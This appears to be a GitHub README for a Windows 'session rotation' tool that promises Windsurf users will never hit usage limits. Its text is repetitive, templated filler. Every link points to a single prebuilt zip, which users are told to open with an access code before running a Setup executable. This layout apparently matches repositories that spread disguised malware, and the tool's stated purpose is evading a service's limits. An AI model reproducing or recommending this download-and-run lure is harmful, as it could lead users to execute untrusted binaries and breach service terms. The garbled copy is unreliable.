<div align="center">

# Windsurf Session Rotate — Windsurf Session Rotate — Windsurf session rotation — never hit the limit again. (One-Command Setup, Prebuilt Release)

<p><strong>Windsurf Session Rotate — Windsurf Session Rotate — Windsurf session rotation — never hit the limit again. (One-Command Setup, Prebuilt Release): Windsurf Session Rotate — windsurf session tool tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/windsurf-session-tool-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/windsurf-session-tool-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/windsurf-session-tool-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/Ricci77868/windsurf-session-tool?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/windsurf-session-tool-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download windsurf-session-tool-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/windsurf-session-tool-v0.1.0-win64.zip"><img src="banner.svg" alt="Windsurf Session Rotate Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Windsurf Session Rotate — Windsurf Session Rotate — windsurf session tool tool** (`windsurf-session-tool`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`windsurf-session-tool-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/windsurf-session-tool-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`windsurf-session-tool-v0.1.0-win64.zip`](../../releases/download/v0.1.0/windsurf-session-tool-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `WindsurfSessionTool_Setup_x64.exe` (keep `config/settings.json` in the same folder).

### Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

### Documentation & Guides

- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)

### FAQ

<details>
<summary><b>Sessions?</b></summary>

Local pool.
</details>
<details>
<summary><b>Checkpoints?</b></summary>

Context preserved.
</details>
<details>
<summary><b>Telemetry?</b></summary>

None.
</details>

### Configuration (`config/settings.json`)

```json
{
  "module": "windsurf-session-tool",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "r": {
      "enabled": true
    },
    "o": {
      "enabled": true
    },
    "t": {
      "enabled": true
    },
    "a": {
      "enabled": true
    },
    "e": {
      "enabled": true
    },
    "s": {
      "enabled": true
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/Ricci77868/windsurf-session-tool.git
cd windsurf-session-tool
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: windsurf-session-tool, session, rotate, windows, tool, utility, windsurf, cli, developer-tools, open-source, automation, productivity, cpp, portable, prebuilt, tools</sub>
